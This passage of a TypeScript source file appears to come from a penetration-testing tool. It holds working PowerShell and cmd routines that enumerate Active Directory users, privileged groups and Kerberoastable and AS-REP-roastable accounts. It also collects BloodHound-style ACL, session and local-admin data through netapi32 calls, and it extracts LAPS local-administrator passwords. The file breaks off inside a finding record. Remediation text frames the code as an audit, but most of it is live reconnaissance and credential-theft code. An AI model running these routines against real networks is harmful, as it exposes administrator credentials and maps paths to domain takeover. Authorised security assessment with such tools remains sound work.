import { ps, cmd, wmic, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function adEnum(args: string[], timeout: number): Promise<HookResult> {
  const target = argVal(args, "--target")
  const usersOnly = hasFlag(args, "--users-only")
  const groupsOnly = hasFlag(args, "--groups-only")
  const computersOnly = hasFlag(args, "--computers-only")
  const spnsOnly = hasFlag(args, "--spns-only")
  const customFilter = argVal(args, "--ldap-filter")
  const findings: Finding[] = []
  const output: string[] = ["[*] Active Directory enumeration...\n"]

  const exec = activeExec
  if (exec === "cmd" || exec === "bat" || exec === "wmic") {
    const domainFlag = target ? `/domain:${target}` : "/domain"
    const cmds: string[] = []

    cmds.push(
      `echo === DOMAIN INFO === && nltest /dsgetdc:${target || "%USERDOMAIN%"} && echo. && nltest /dclist:${target || "%USERDOMAIN%"}`,
    )
    cmds.push(`echo === TRUST RELATIONSHIPS === && nltest /domain_trusts /all_trusts`)

    if (!usersOnly && !groupsOnly && !computersOnly && !spnsOnly) {
      cmds.push(`echo === ORGANIZATIONAL UNITS === && dsquery ou ${target ? `-domain ${target}` : ""} -limit 0`)
    }

    if (!groupsOnly && !computersOnly && !spnsOnly) {
      cmds.push(`echo === USERS === && net user ${domainFlag}`)
      cmds.push(
        `echo === DISABLED ACCOUNTS === && dsquery user -disabled -limit 0 ${target ? `-domain ${target}` : ""}`,
      )
      cmds.push(
        `echo === STALE ACCOUNTS (90+ days) === && dsquery user -stalepwd 90 -limit 0 ${target ? `-domain ${target}` : ""}`,
      )
    }

    if (!usersOnly && !computersOnly && !spnsOnly) {
      cmds.push(
        `echo === PRIVILEGED GROUPS === && for %G in ("Domain Admins" "Enterprise Admins" "Schema Admins" "Administrators" "Backup Operators" "Account Operators" "Server Operators" "DnsAdmins") do @(echo --- %~G --- && net group %G ${domainFlag} 2>nul || net localgroup %G 2>nul)`,
      )
    }

    if (!usersOnly && !groupsOnly && !spnsOnly) {
      cmds.push(`echo === COMPUTERS === && dsquery computer ${target ? `-domain ${target}` : ""} -limit 0`)
      cmds.push(`echo === DOMAIN CONTROLLERS === && dsquery server ${target ? `-domain ${target}` : ""} -limit 0`)
    }

    cmds.push(`echo === ACCOUNT POLICY === && net accounts ${domainFlag}`)

    if (exec === "wmic") {
      cmds.push(
        `echo === USERS via WMIC === && wmic /namespace:\\\\root\\directory\\LDAP path ds_user get ds_samaccountname,ds_useraccountcontrol,ds_admincount,ds_pwdlastset /format:list`,
      )
      cmds.push(
        `echo === GROUPS via WMIC === && wmic /namespace:\\\\root\\directory\\LDAP path ds_group get ds_samaccountname,ds_member /format:list`,
      )
    }

    for (const c of cmds) {
      const r = await cmd(c, timeout)
      output.push(r.stdout)
      if (r.stderr && !r.stderr.includes("completed successfully")) output.push(r.stderr)
    }

    output.push("\n[*] Note: cmd-based AD enum is limited vs PowerShell LDAP queries")
    output.push("[*] For SPN/Kerberoast enumeration, use: setspn -T <domain> -Q */*")
    output.push("[*] For full enumeration with UAC flags, use PowerShell mode")
    return { output: output.join("\n"), findings }
  }

  const domainTarget = target
    ? `"LDAP://${target}"`
    : `"LDAP://$([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name)"`

  const script = `
$ErrorActionPreference = 'SilentlyContinue'
$domain = ${target ? `[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain','${target}')))` : `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`}
$forest = ${target ? `[System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest','${target}')))` : `[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()`}
$rootDSE = [ADSI]${domainTarget.replace("LDAP://", '"LDAP://').replace(/$/, '/RootDSE"')}
if (-not $rootDSE) { $rootDSE = [ADSI]"LDAP://RootDSE" }
$defaultNC = $rootDSE.defaultNamingContext
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$defaultNC")
$searcher.PageSize = 1000

Write-Output "=== DOMAIN INFO ==="
Write-Output "Domain: $($domain.Name)"
Write-Output "Forest: $($forest.Name)"
Write-Output "Forest Root: $($forest.RootDomain)"
Write-Output "Domain Mode: $($domain.DomainMode)"
Write-Output "Forest Mode: $($forest.ForestMode)"
Write-Output "PDC: $($domain.PdcRoleOwner)"
Write-Output "Schema Master: $($forest.SchemaRoleOwner)"
Write-Output "Naming Master: $($forest.NamingRoleOwner)"

$dcs = $domain.DomainControllers
Write-Output "\\n=== DOMAIN CONTROLLERS ($($dcs.Count)) ==="
foreach ($dc in $dcs) {
  Write-Output "  $($dc.Name) [$($dc.IPAddress)] OS=$($dc.OSVersion) Roles=$($dc.Roles -join ',')"
}

$trusts = $domain.GetAllTrustRelationships()
Write-Output "\\n=== TRUST RELATIONSHIPS ($($trusts.Count)) ==="
foreach ($t in $trusts) {
  Write-Output "  $($t.TargetName) | Direction=$($t.TrustDirection) | Type=$($t.TrustType)"
}

${
  usersOnly || groupsOnly || computersOnly || spnsOnly
    ? ""
    : `
$searcher.Filter = "(objectClass=organizationalUnit)"
$searcher.PropertiesToLoad.AddRange(@("name","distinguishedName"))
$ous = $searcher.FindAll()
Write-Output "\\n=== ORGANIZATIONAL UNITS ($($ous.Count)) ==="
foreach ($ou in $ous) {
  Write-Output "  $($ou.Properties['distinguishedname'][0])"
}
$searcher.PropertiesToLoad.Clear()
`
}

${
  groupsOnly || computersOnly || spnsOnly
    ? ""
    : `
Write-Output "\\n=== USERS ==="
$searcher.Filter = ${customFilter ? `"${customFilter}"` : '"(&(objectCategory=person)(objectClass=user))"'}
$searcher.PropertiesToLoad.AddRange(@("samaccountname","displayname","useraccountcontrol","pwdlastset","lastlogon","admincount","memberof","serviceprincipalname","description","mail"))
$users = $searcher.FindAll()
$enabled = 0; $disabled = 0; $adminCount = 0; $neverExpire = 0; $noPreAuth = 0
foreach ($u in $users) {
  $uac = [int]$u.Properties['useraccountcontrol'][0]
  $isDisabled = ($uac -band 0x2) -ne 0
  $isAdmin = $u.Properties['admincount'].Count -gt 0 -and [int]$u.Properties['admincount'][0] -eq 1
  $noPre = ($uac -band 0x400000) -ne 0
  $noExpire = ($uac -band 0x10000) -ne 0
  if ($isDisabled) { $disabled++ } else { $enabled++ }
  if ($isAdmin) { $adminCount++ }
  if ($noPre) { $noPreAuth++ }
  if ($noExpire) { $neverExpire++ }
  $pwdLastSet = if ($u.Properties['pwdlastset'].Count -gt 0 -and [long]$u.Properties['pwdlastset'][0] -gt 0) { [DateTime]::FromFileTime([long]$u.Properties['pwdlastset'][0]).ToString('yyyy-MM-dd') } else { 'Never' }
  $lastLogon = if ($u.Properties['lastlogon'].Count -gt 0 -and [long]$u.Properties['lastlogon'][0] -gt 0) { [DateTime]::FromFileTime([long]$u.Properties['lastlogon'][0]).ToString('yyyy-MM-dd') } else { 'Never' }
  $spns = if ($u.Properties['serviceprincipalname'].Count -gt 0) { ($u.Properties['serviceprincipalname'] | ForEach-Object { $_ }) -join ';' } else { '' }
  $desc = if ($u.Properties['description'].Count -gt 0) { $u.Properties['description'][0] } else { '' }
  $flags = @()
  if ($isDisabled) { $flags += 'DISABLED' }
  if ($isAdmin) { $flags += 'ADMINCOUNT' }
  if ($noPre) { $flags += 'NO_PREAUTH' }
  if ($noExpire) { $flags += 'PWD_NEVER_EXPIRES' }
  $flagStr = if ($flags.Count -gt 0) { " [" + ($flags -join ',') + "]" } else { '' }
  Write-Output "  $($u.Properties['samaccountname'][0])$flagStr | PwdSet=$pwdLastSet | LastLogon=$lastLogon$(if($spns){' | SPN='+$spns})$(if($desc){' | Desc='+$desc.Substring(0,[Math]::Min(60,$desc.Length))})"
}
Write-Output "  TOTAL: $($users.Count) users | Enabled=$enabled | Disabled=$disabled | AdminCount=$adminCount | NoPreAuth=$noPreAuth | PwdNeverExpires=$neverExpire"
$searcher.PropertiesToLoad.Clear()
`
}

${
  usersOnly || computersOnly || spnsOnly
    ? ""
    : `
Write-Output "\\n=== PRIVILEGED GROUPS ==="
$privGroups = @('Domain Admins','Enterprise Admins','Schema Admins','Administrators','Backup Operators','Account Operators','Server Operators','DnsAdmins','Group Policy Creator Owners','Print Operators','Remote Desktop Users','Cert Publishers')
foreach ($gName in $privGroups) {
  $searcher.Filter = "(&(objectClass=group)(cn=$gName))"
  $searcher.PropertiesToLoad.AddRange(@("member","cn"))
  $g = $searcher.FindOne()
  if ($g) {
    $members = $g.Properties['member']
    $memberNames = foreach ($m in $members) { ($m -split ',')[0] -replace 'CN=' }
    Write-Output "  $gName ($($members.Count)): $($memberNames -join ', ')"
  }
  $searcher.PropertiesToLoad.Clear()
}
`
}

${
  usersOnly || groupsOnly || spnsOnly
    ? ""
    : `
Write-Output "\\n=== COMPUTERS ==="
$searcher.Filter = "(objectClass=computer)"
$searcher.PropertiesToLoad.AddRange(@("cn","operatingsystem","operatingsystemversion","lastlogon","dnshostname"))
$computers = $searcher.FindAll()
$osCounts = @{}
foreach ($c in $computers) {
  $os = if ($c.Properties['operatingsystem'].Count -gt 0) { $c.Properties['operatingsystem'][0] } else { 'Unknown' }
  if (-not $osCounts.ContainsKey($os)) { $osCounts[$os] = 0 }
  $osCounts[$os]++
  $lastLogon = if ($c.Properties['lastlogon'].Count -gt 0 -and [long]$c.Properties['lastlogon'][0] -gt 0) { [DateTime]::FromFileTime([long]$c.Properties['lastlogon'][0]).ToString('yyyy-MM-dd') } else { 'Never' }
  Write-Output "  $($c.Properties['cn'][0]) | $os | LastLogon=$lastLogon | DNS=$($c.Properties['dnshostname'][0])"
}
Write-Output "  TOTAL: $($computers.Count) | OS Distribution: $(($osCounts.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join ', ')"
$searcher.PropertiesToLoad.Clear()
`
}

${
  usersOnly || groupsOnly || computersOnly
    ? ""
    : `
Write-Output "\\n=== SPN ACCOUNTS (Kerberoastable) ==="
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname","admincount","pwdlastset","memberof"))
$spnUsers = $searcher.FindAll()
foreach ($s in $spnUsers) {
  $isAdmin = $s.Properties['admincount'].Count -gt 0 -and [int]$s.Properties['admincount'][0] -eq 1
  $pwdSet = if ($s.Properties['pwdlastset'].Count -gt 0 -and [long]$s.Properties['pwdlastset'][0] -gt 0) { [DateTime]::FromFileTime([long]$s.Properties['pwdlastset'][0]).ToString('yyyy-MM-dd') } else { 'Never' }
  Write-Output "  $($s.Properties['samaccountname'][0])$(if($isAdmin){' [ADMIN]'}) | PwdSet=$pwdSet | SPNs=$($s.Properties['serviceprincipalname'] -join ';')"
}
Write-Output "  TOTAL Kerberoastable: $($spnUsers.Count)"
$searcher.PropertiesToLoad.Clear()
`
}

Write-Output "\\n=== ADMINSDHOLDER PROTECTED ==="
$searcher.Filter = "(adminCount=1)"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","objectclass"))
$adminSD = $searcher.FindAll()
Write-Output "  Protected objects: $($adminSD.Count)"
foreach ($a in $adminSD) {
  Write-Output "    $($a.Properties['samaccountname'][0]) ($($a.Properties['objectclass'][$a.Properties['objectclass'].Count-1]))"
}
$searcher.PropertiesToLoad.Clear()

Write-Output "\\n=== FINE-GRAINED PASSWORD POLICIES ==="
$searcher.Filter = "(objectClass=msDS-PasswordSettings)"
$searcher.PropertiesToLoad.AddRange(@("cn","msDS-MinimumPasswordLength","msDS-PasswordHistoryLength","msDS-LockoutThreshold","msDS-PSOAppliesTo"))
$fgpps = $searcher.FindAll()
if ($fgpps.Count -eq 0) { Write-Output "  None found (default domain policy only)" }
foreach ($p in $fgpps) {
  Write-Output "  $($p.Properties['cn'][0]) | MinLen=$($p.Properties['msds-minimumpasswordlength'][0]) | History=$($p.Properties['msds-passwordhistorylength'][0]) | Lockout=$($p.Properties['msds-lockoutthreshold'][0])"
  foreach ($target in $p.Properties['msds-psoapplies to']) { Write-Output "    AppliesTo: $target" }
}
$searcher.PropertiesToLoad.Clear()

Write-Output "\\n=== KRBTGT ACCOUNT ==="
$searcher.Filter = "(samaccountname=krbtgt)"
$searcher.PropertiesToLoad.AddRange(@("pwdlastset","msds-keyversionnumber"))
$krb = $searcher.FindOne()
if ($krb) {
  $pwdSet = [DateTime]::FromFileTime([long]$krb.Properties['pwdlastset'][0]).ToString('yyyy-MM-dd HH:mm:ss')
  $kvno = if ($krb.Properties['msds-keyversionnumber'].Count -gt 0) { $krb.Properties['msds-keyversionnumber'][0] } else { '?' }
  Write-Output "  krbtgt password last set: $pwdSet | Key version: $kvno"
}
`

  const result = await ps(script, timeout)
  if (result.exitCode !== 0 && result.stdout.length < 50) {
    output.push(`[!] AD enumeration failed: ${result.stderr.trim().substring(0, 300)}`)
    return { output: output.join("\n"), findings }
  }

  output.push(result.stdout)

  const lines = result.stdout
  const noPreAuthMatch = lines.match(/NoPreAuth=(\d+)/)
  if (noPreAuthMatch && parseInt(noPreAuthMatch[1]) > 0) {
    findings.push({
      checkId: "WIN-AD-001",
      provider: "windows",
      severity: "high",
      status: "FAIL",
      resource: "ad://users",
      title: `${noPreAuthMatch[1]} accounts with Kerberos pre-auth disabled (AS-REP roastable)`,
      details: "Accounts without pre-authentication can have their hashes requested by any user",
      remediation: "Enable Kerberos pre-authentication on all accounts unless absolutely required",
    })
  }

  const kerberoastMatch = lines.match(/TOTAL Kerberoastable: (\d+)/)
  if (kerberoastMatch && parseInt(kerberoastMatch[1]) > 0) {
    findings.push({
      checkId: "WIN-AD-002",
      provider: "windows",
      severity: "high",
      status: "ENUMERATED",
      resource: "ad://spn-accounts",
      title: `${kerberoastMatch[1]} kerberoastable SPN accounts found`,
      details: "Service accounts with SPNs can have their TGS tickets requested and cracked offline",
      remediation: "Use MSA/gMSA for service accounts, enforce strong passwords (25+ chars)",
    })
  }

  if (lines.includes("ADMIN]")) {
    findings.push({
      checkId: "WIN-AD-003",
      provider: "windows",
      severity: "critical",
      status: "ENUMERATED",
      resource: "ad://spn-accounts",
      title: "Kerberoastable accounts with AdminCount=1 found",
      details: "Privileged SPN accounts can be kerberoasted — cracking yields domain admin",
      remediation: "Remove SPNs from privileged accounts or switch to gMSA",
    })
  }

  const krbtgtMatch = lines.match(/krbtgt password last set: (\d{4}-\d{2}-\d{2})/)
  if (krbtgtMatch) {
    const setDate = new Date(krbtgtMatch[1])
    const ageMs = Date.now() - setDate.getTime()
    const ageDays = Math.floor(ageMs / (1000 * 60 * 60 * 24))
    if (ageDays > 180) {
      findings.push({
        checkId: "WIN-AD-004",
        provider: "windows",
        severity: "high",
        status: "FAIL",
        resource: "ad://krbtgt",
        title: `krbtgt password ${ageDays} days old (last set: ${krbtgtMatch[1]})`,
        details: "Stale krbtgt key increases golden ticket attack window",
        remediation: "Rotate krbtgt password twice (two replication cycles) per Microsoft guidance",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function bloodhoundCollect(args: string[], timeout: number): Promise<HookResult> {
  const target = argVal(args, "--target")
  const methods = argVal(args, "--methods") || "all"
  const outfile = argVal(args, "--outfile") || "C:\\Windows\\Temp\\cs-bh-data.json"
  const computersFile = argVal(args, "--computers")
  const findings: Finding[] = []
  const output: string[] = ["[*] Collecting AD relationship data for attack-path analysis...\n"]

  const exec = activeExec
  if (exec === "cmd" || exec === "bat" || exec === "wmic") {
    const cmds: string[] = []

    cmds.push(
      `echo === GROUP MEMBERSHIPS === && for %G in ("Domain Admins" "Enterprise Admins" "Schema Admins" "Administrators" "Backup Operators" "Account Operators" "Server Operators" "DnsAdmins" "Remote Desktop Users" "Cert Publishers") do @(echo --- %~G --- && net group %G /domain 2>nul || net localgroup %G 2>nul)`,
    )

    cmds.push(`echo === TRUST RELATIONSHIPS === && nltest /domain_trusts /all_trusts`)

    cmds.push(`echo === SESSIONS (current host) === && net session 2>nul && echo. && query user 2>nul`)

    const computerTargets = computersFile
      ? `for /f "tokens=*" %C in ('type "${computersFile}"') do @(`
      : `for /f "tokens=*" %C in ('dsquery computer -limit 20') do @(`
    cmds.push(
      `echo === LOCAL ADMINS ON REMOTE === && ${computerTargets}echo --- %C --- && net localgroup Administrators /domain 2>nul)`,
    )

    cmds.push(`echo === DOMAIN COMPUTERS === && dsquery computer -limit 0 && echo. && net view /domain 2>nul`)

    if (exec === "wmic") {
      cmds.push(
        `echo === GROUPS via WMIC === && wmic /namespace:\\\\root\\directory\\LDAP path ds_group get ds_samaccountname,ds_member /format:list`,
      )
      cmds.push(
        `echo === TRUSTS via WMIC === && wmic /namespace:\\\\root\\directory\\LDAP path ds_trusteddomain get ds_cn,ds_trustdirection,ds_trusttype /format:list`,
      )
    }

    for (const c of cmds) {
      const r = await cmd(c, timeout)
      output.push(r.stdout)
    }

    output.push(`\n[*] Note: cmd-based BloodHound-style collection is limited`)
    output.push(`[*] For full ACL enumeration, NetSession/LocalAdmin via NetAPI, use PowerShell mode`)
    output.push(`[*] Consider: net session \\\\<target> to enumerate remote sessions`)

    findings.push({
      checkId: "WIN-BH-001",
      provider: "windows",
      severity: "info",
      status: "COLLECTED",
      resource: "ad://cmd-collection",
      title: "AD relationship data collected via cmd.exe (limited scope)",
      details: "Group memberships, trusts, sessions, and local admins enumerated via net/nltest/dsquery",
      remediation: "Analyze output for attack paths",
    })

    return { output: output.join("\n"), findings }
  }

  const script = `
$ErrorActionPreference = 'SilentlyContinue'
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class NetAPI {
    [DllImport("netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int NetSessionEnum(
        string serverName, string uncClientName, string userName,
        int level, out IntPtr bufPtr, int prefMaxLen,
        out int entriesRead, out int totalEntries, ref int resumeHandle);

    [DllImport("netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int NetLocalGroupGetMembers(
        string serverName, string localGroupName, int level,
        out IntPtr bufPtr, int prefMaxLen,
        out int entriesRead, out int totalEntries, ref IntPtr resumeHandle);

    [DllImport("netapi32.dll")]
    public static extern int NetApiBufferFree(IntPtr buffer);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct SESSION_INFO_10 {
        public string sesi10_cname;
        public string sesi10_username;
        public int sesi10_time;
        public int sesi10_idle_time;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct LOCALGROUP_MEMBERS_INFO_2 {
        public IntPtr lgrmi2_sid;
        public int lgrmi2_sidusage;
        public string lgrmi2_domainandname;
    }
}
"@

$data = @{
  meta = @{ type = 'cyberstrike-bh'; collected = (Get-Date -Format 'yyyy-MM-ddTHH:mm:ss'); methods = '${methods}' }
  groups = @()
  acls = @()
  sessions = @()
  localadmins = @()
  trusts = @()
}

$defaultNC = ([ADSI]"LDAP://RootDSE").defaultNamingContext
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$defaultNC")
$searcher.PageSize = 1000

# === GROUP MEMBERSHIPS ===
${methods === "all" || methods === "acl" ? "" : "if ($false) {"}
$searcher.Filter = "(objectClass=group)"
$searcher.PropertiesToLoad.AddRange(@("cn","member","distinguishedname","samaccountname","grouptype"))
$groups = $searcher.FindAll()
foreach ($g in $groups) {
  $members = @()
  foreach ($m in $g.Properties['member']) {
    $members += ($m -split ',')[0] -replace 'CN='
  }
  $data.groups += @{
    name = [string]$g.Properties['samaccountname'][0]
    dn = [string]$g.Properties['distinguishedname'][0]
    members = $members
    type = [int]$g.Properties['grouptype'][0]
  }
}
${methods === "all" || methods === "acl" ? "" : "}"}

# === DANGEROUS ACLs ===
${methods === "all" || methods === "acl" ? "" : "if ($false) {"}
$dangerousRights = @(
  'GenericAll','GenericWrite','WriteDacl','WriteOwner','WriteProperty',
  'Self','ExtendedRight','ForceChangePassword','AllExtendedRights'
)
$rightsGuid = @{
  '00299570-246d-11d0-a768-00aa006e0529' = 'ForceChangePassword'
  '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' = 'DS-Replication-Get-Changes'
  '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' = 'DS-Replication-Get-Changes-All'
  'ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501' = 'ms-DS-Key-Credential-Link'
}

$objectTypes = @('user','computer','group','groupPolicyContainer')
foreach ($objType in $objectTypes) {
  $searcher.Filter = "(objectCategory=$objType)"
  $searcher.PropertiesToLoad.AddRange(@("distinguishedname","samaccountname","ntsecuritydescriptor"))
  $searcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
  $objects = $searcher.FindAll()
  foreach ($obj in $objects) {
    try {
      $de = $obj.GetDirectoryEntry()
      $sd = $de.ObjectSecurity
      foreach ($ace in $sd.GetAccessRules($true, $false, [System.Security.Principal.NTAccount])) {
        $rightStr = $ace.ActiveDirectoryRights.ToString()
        $isDangerous = $false
        foreach ($dr in $dangerousRights) {
          if ($rightStr -match $dr) { $isDangerous = $true; break }
        }
        $extGuid = ''
        if ($ace.ObjectType -and $ace.ObjectType.Guid -ne '00000000-0000-0000-0000-000000000000') {
          $guidStr = $ace.ObjectType.Guid.ToString()
          if ($rightsGuid.ContainsKey($guidStr)) { $extGuid = $rightsGuid[$guidStr]; $isDangerous = $true }
        }
        if ($isDangerous -and $ace.AccessControlType -eq 'Allow' -and $ace.IdentityReference.Value -notmatch 'BUILTIN|NT AUTHORITY|S-1-5-18|S-1-5-32') {
          $data.acls += @{
            target = [string]$obj.Properties['samaccountname'][0]
            targetType = $objType
            principal = $ace.IdentityReference.Value
            rights = $rightStr
            extended = $extGuid
            inherited = $ace.IsInherited
          }
        }
      }
    } catch {}
  }
  $searcher.PropertiesToLoad.Clear()
}
${methods === "all" || methods === "acl" ? "" : "}"}

# === SESSIONS ===
${methods === "all" || methods === "session" ? "" : "if ($false) {"}
$searcher.Filter = "(objectClass=computer)"
$searcher.PropertiesToLoad.AddRange(@("dnshostname"))
$targets = $searcher.FindAll() | ForEach-Object { $_.Properties['dnshostname'][0] }
${computersFile ? `$targets = Get-Content '${computersFile}'` : ""}
$targets = $targets | Select-Object -First 50
foreach ($comp in $targets) {
  try {
    $bufPtr = [IntPtr]::Zero
    $entriesRead = 0; $totalEntries = 0; $resumeHandle = 0
    $ret = [NetAPI]::NetSessionEnum($comp, $null, $null, 10, [ref]$bufPtr, -1, [ref]$entriesRead, [ref]$totalEntries, [ref]$resumeHandle)
    if ($ret -eq 0 -and $entriesRead -gt 0) {
      $offset = $bufPtr.ToInt64()
      $structSize = [Runtime.InteropServices.Marshal]::SizeOf([type][NetAPI+SESSION_INFO_10])
      for ($i = 0; $i -lt $entriesRead; $i++) {
        $s = [Runtime.InteropServices.Marshal]::PtrToStructure([IntPtr]($offset + $i * $structSize), [type][NetAPI+SESSION_INFO_10])
        $data.sessions += @{ computer = $comp; user = $s.sesi10_username; source = $s.sesi10_cname -replace '\\\\','' }
      }
    }
    if ($bufPtr -ne [IntPtr]::Zero) { [NetAPI]::NetApiBufferFree($bufPtr) | Out-Null }
  } catch {}
}
$searcher.PropertiesToLoad.Clear()
${methods === "all" || methods === "session" ? "" : "}"}

# === LOCAL ADMINS ===
${methods === "all" || methods === "localadmin" ? "" : "if ($false) {"}
foreach ($comp in $targets) {
  try {
    $bufPtr = [IntPtr]::Zero
    $entriesRead = 0; $totalEntries = 0; $resumeHandle = [IntPtr]::Zero
    $ret = [NetAPI]::NetLocalGroupGetMembers($comp, "Administrators", 2, [ref]$bufPtr, -1, [ref]$entriesRead, [ref]$totalEntries, [ref]$resumeHandle)
    if ($ret -eq 0 -and $entriesRead -gt 0) {
      $offset = $bufPtr.ToInt64()
      $structSize = [Runtime.InteropServices.Marshal]::SizeOf([type][NetAPI+LOCALGROUP_MEMBERS_INFO_2])
      for ($i = 0; $i -lt $entriesRead; $i++) {
        $m = [Runtime.InteropServices.Marshal]::PtrToStructure([IntPtr]($offset + $i * $structSize), [type][NetAPI+LOCALGROUP_MEMBERS_INFO_2])
        $data.localadmins += @{ computer = $comp; member = $m.lgrmi2_domainandname; type = $m.lgrmi2_sidusage }
      }
    }
    if ($bufPtr -ne [IntPtr]::Zero) { [NetAPI]::NetApiBufferFree($bufPtr) | Out-Null }
  } catch {}
}
${methods === "all" || methods === "localadmin" ? "" : "}"}

# === TRUSTS ===
${methods === "all" || methods === "trusts" ? "" : "if ($false) {"}
$searcher.Filter = "(objectClass=trustedDomain)"
$searcher.PropertiesToLoad.AddRange(@("cn","trustDirection","trustType","trustAttributes","securityIdentifier"))
$trustObjs = $searcher.FindAll()
foreach ($t in $trustObjs) {
  $data.trusts += @{
    name = [string]$t.Properties['cn'][0]
    direction = [int]$t.Properties['trustdirection'][0]
    type = [int]$t.Properties['trusttype'][0]
    attributes = [int]$t.Properties['trustattributes'][0]
  }
}
$searcher.PropertiesToLoad.Clear()
${methods === "all" || methods === "trusts" ? "" : "}"}

$json = $data | ConvertTo-Json -Depth 5 -Compress
$json | Out-File -FilePath '${outfile}' -Encoding UTF8
Write-Output "GROUPS=$($data.groups.Count)"
Write-Output "ACLS=$($data.acls.Count)"
Write-Output "SESSIONS=$($data.sessions.Count)"
Write-Output "LOCALADMINS=$($data.localadmins.Count)"
Write-Output "TRUSTS=$($data.trusts.Count)"
Write-Output "OUTFILE=${outfile}"

# Show dangerous ACLs summary
$dangerousAcls = $data.acls | Where-Object { $_.rights -match 'GenericAll|WriteDacl|WriteOwner' -and -not $_.inherited }
if ($dangerousAcls.Count -gt 0) {
  Write-Output "\\nDANGEROUS_ACLS:"
  foreach ($a in $dangerousAcls | Select-Object -First 30) {
    Write-Output "  $($a.principal) -> $($a.target) ($($a.targetType)): $($a.rights)$(if($a.extended){' ['+$a.extended+']'})"
  }
}
`

  const result = await ps(script, timeout)
  if (result.exitCode !== 0 && result.stdout.length < 50) {
    output.push(`[!] BloodHound collection failed: ${result.stderr.trim().substring(0, 300)}`)
    return { output: output.join("\n"), findings }
  }

  output.push(result.stdout)

  const aclCountMatch = result.stdout.match(/ACLS=(\d+)/)
  const dangerousSection = result.stdout.includes("DANGEROUS_ACLS:")
  if (aclCountMatch) {
    output.push(`\n[+] Data saved to: ${outfile}`)
    findings.push({
      checkId: "WIN-BH-001",
      provider: "windows",
      severity: "info",
      status: "COLLECTED",
      resource: `file://${outfile}`,
      title: `BloodHound data collected: ${aclCountMatch[1]} ACLs`,
      details: result.stdout
        .split("\n")
        .filter((l) => l.match(/^(GROUPS|ACLS|SESSIONS|LOCALADMINS|TRUSTS)=/))
        .join(", "),
      remediation: "Analyze the JSON data for attack paths",
    })
  }

  if (dangerousSection) {
    findings.push({
      checkId: "WIN-BH-002",
      provider: "windows",
      severity: "critical",
      status: "FAIL",
      resource: "ad://acls",
      title: "Dangerous non-inherited ACLs found (GenericAll/WriteDACL/WriteOwner)",
      details: "Non-default ACLs granting full control to non-builtin principals — likely attack paths",
      remediation: "Review and remediate overly permissive ACLs with BloodHound or ADACLScanner",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function lapsDump(args: string[], timeout: number): Promise<HookResult> {
  const target = argVal(args, "--target")
  const computer = argVal(args, "--computer")
  const legacyOnly = hasFlag(args, "--legacy")
  const winLapsOnly = hasFlag(args, "--windows-laps")
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting LAPS passwords...\n"]

  const exec = activeExec
  if (exec === "cmd" || exec === "bat" || exec === "wmic") {
    const cmds: string[] = []

    cmds.push(
      `echo === LAPS SCHEMA CHECK === && dsquery * "CN=Schema,CN=Configuration,%s" -filter "(lDAPDisplayName=ms-Mcs-AdmPwd)" -attr lDAPDisplayName 2>nul && dsquery * "CN=Schema,CN=Configuration,%s" -filter "(lDAPDisplayName=msLAPS-Password)" -attr lDAPDisplayName 2>nul`,
    )

    if (!winLapsOnly) {
      const compFilter = computer
        ? `-filter "(&(objectClass=computer)(cn=${computer})(ms-Mcs-AdmPwd=*))"`
        : `-filter "(&(objectClass=computer)(ms-Mcs-AdmPwd=*))"`
      cmds.push(
        `echo === LEGACY LAPS PASSWORDS === && dsquery * -limit 0 ${compFilter} -attr cn ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime operatingSystem 2>nul`,
      )
    }

    if (!legacyOnly) {
      const compFilter2 = computer
        ? `-filter "(&(objectClass=computer)(cn=${computer})(msLAPS-Password=*))"`
        : `-filter "(&(objectClass=computer)(msLAPS-Password=*))"`
      cmds.push(
        `echo === WINDOWS LAPS PASSWORDS === && dsquery * -limit 0 ${compFilter2} -attr cn msLAPS-Password msLAPS-PasswordExpirationTime operatingSystem 2>nul`,
      )
    }

    if (exec === "wmic") {
      cmds.push(
        `echo === LAPS VIA WMIC === && wmic /namespace:\\\\root\\directory\\LDAP path ds_computer where "ds_ms_Mcs_AdmPwd IS NOT NULL" get ds_cn,ds_ms_Mcs_AdmPwd /format:list 2>nul`,
      )
    }

    cmds.push(
      `echo === LAPS INSTALL CHECK === && reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\LAPS" 2>nul && reg query "HKLM\\SOFTWARE\\Policies\\Microsoft Services\\AdmPwd" 2>nul && reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\LAPS\\State" 2>nul`,
    )

    for (const c of cmds) {
      const r = await cmd(c, timeout)
      output.push(r.stdout)
    }

    if (output.join("").includes("ms-Mcs-AdmPwd")) {
      findings.push({
        checkId: "WIN-LAPS-001",
        provider: "windows",
        severity: "critical",
